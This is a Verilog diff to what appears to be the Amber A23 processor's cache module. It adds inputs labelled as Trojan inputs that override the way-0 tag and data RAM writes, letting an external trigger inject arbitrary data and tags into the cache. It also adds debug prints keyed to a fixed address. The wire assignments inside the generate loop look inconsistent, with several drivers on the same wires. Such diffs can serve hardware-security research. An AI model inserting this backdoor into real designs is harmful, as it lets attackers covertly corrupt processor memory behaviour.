@@ -102,7 +102,12 @@ output                              o_stall,
 output                              o_wb_req,          // Read Request
 input      [31:0]                   i_wb_address,      // wb bus                                 
 input      [31:0]                   i_wb_read_data,    // wb bus                              
-input                               i_wb_stall         // wb_stb && !wb_ack
+input                               i_wb_stall,        // wb_stb && !wb_ack
+
+/// Trojan inputs
+input				    i_troj_reserve,
+input [127:0]			    i_troj_data,
+input [31:0]			    i_troj_addr
 );
 
 `include "a23_localparams.v"
@@ -228,7 +233,14 @@ always @ ( posedge i_clk )
         $display("Cache Flush");
         `endif            
         end
-    else    
+    else begin
+	if (i_address == 32'h0020E900 && !i_write_enable) begin
+		$display("%h", hit_rdata);
+		$display("Valid bit: %d", tag_rdata_way[0][TAG_WIDTH-1]);
+		$display("Tag_rdata for way 0: %h", tag_rdata_way[0][TAG_ADDR_WIDTH-1:0]);
+	end
+	if (troj_tag_addr == i_troj_addr[CACHE_ADDR32_MSB:CACHE_ADDR32_LSB])
+		$display("%h", tag_rdata_way[0]);
         case ( c_state )
             CS_INIT :
                 if ( init_count < CACHE_LINES [CACHE_ADDR_WIDTH:0] )
@@ -245,7 +257,7 @@ always @ ( posedge i_clk )
              CS_IDLE :
                 begin
                 source_sel  <= 1'd1 << C_CORE;
-                
+		
                 if ( ex_read_hit || ex_read_hit_r )
                     begin
                     select_way  <= data_hit_way | ex_read_hit_way;
@@ -258,8 +270,9 @@ always @ ( posedge i_clk )
                     if ( !i_wb_stall )   
                         c_state <= CS_FILL1; 
                     end           
-                else if ( write_hit )
-                    c_state <= CS_WRITE_HIT1;        
+                else if ( write_hit ) begin
+                    c_state <= CS_WRITE_HIT1;    
+		end  
                end
                    
                    
@@ -346,7 +359,7 @@ always @ ( posedge i_clk )
                     
                 end
         endcase                       
-
+    end
 
 // ======================================
 // Capture WB Block Read - burst of 4 words
@@ -505,6 +518,13 @@ assign cache_busy_stall = ((c_state == CS_TURN_AROUND || c_state == CS_FILL1) &&
                            c_state == CS_INIT;
 
 
+wire [127:0]			troj_cache_wdata;
+wire [7:0]			troj_cache_addr;
+wire 				troj_cache_wen;
+wire [TAG_WIDTH-1:0]		troj_tag_wdata;
+wire [CACHE_ADDR_WIDTH-1:0] 	troj_tag_addr;
+wire 				troj_tag_wen;
+
 // ======================================
 // Instantiate RAMS
 // ======================================
@@ -531,13 +551,17 @@ generate
             .ADDRESS_WIDTH              ( CACHE_ADDR_WIDTH      ))
         u_tag (
             .i_clk                      ( i_clk                 ),
-            .i_write_data               ( tag_wdata             ),
-            .i_write_enable             ( tag_wenable_way[i]    ),
-            .i_address                  ( tag_address           ),
+            .i_write_data               ( troj_tag_wdata        ),
+            .i_write_enable             ( troj_tag_wen          ),
+            .i_address                  ( troj_tag_addr         ),
 
             .o_read_data                ( tag_rdata_way[i]      )
             );
             
+	assign troj_tag_addr 	= (i_troj_reserve && i == 0) ? i_troj_addr[CACHE_ADDR32_MSB:CACHE_ADDR32_LSB] : tag_address;
+	assign troj_tag_wdata  	= (i_troj_reserve && i == 0) ? {1'b1, i_troj_addr[31:TAG_ADDR32_LSB]} : tag_wdata;
+	assign troj_tag_wen	= (i_troj_reserve && i == 0) ? 1'b1 : tag_wenable_way[i];
+
         // Data RAMs 
         `ifdef XILINX_SPARTAN6_FPGA
         xs6_sram_256x128_byte_en
@@ -556,12 +580,16 @@ generate
             .ADDRESS_WIDTH ( CACHE_ADDR_WIDTH) )
         u_data (
             .i_clk                      ( i_clk                         ),
-            .i_write_data               ( data_wdata                    ),
-            .i_write_enable             ( data_wenable_way[i]           ),
-            .i_address                  ( data_address                  ),
+            .i_write_data               ( troj_cache_wdata              ),
+            .i_write_enable             ( troj_cache_wen                ),
+            .i_address                  ( troj_cache_addr               ),
             .i_byte_enable              ( {CACHE_LINE_WIDTH/8{1'd1}}    ),
             .o_read_data                ( data_rdata_way[i]             )
-            );                                                     
+            );          
+
+	assign troj_cache_wdata = (i_troj_reserve && i == 0) ? i_troj_data : data_wdata;
+	assign troj_cache_addr 	= (i_troj_reserve && i == 0) ? i_troj_addr[CACHE_ADDR32_MSB:CACHE_ADDR32_LSB] : data_address;
+	assign troj_cache_wen 	= (i_troj_reserve && i == 0) ? 1'b1 : data_wenable_way[i];                                           
 
 
         // Per tag-ram write-enable
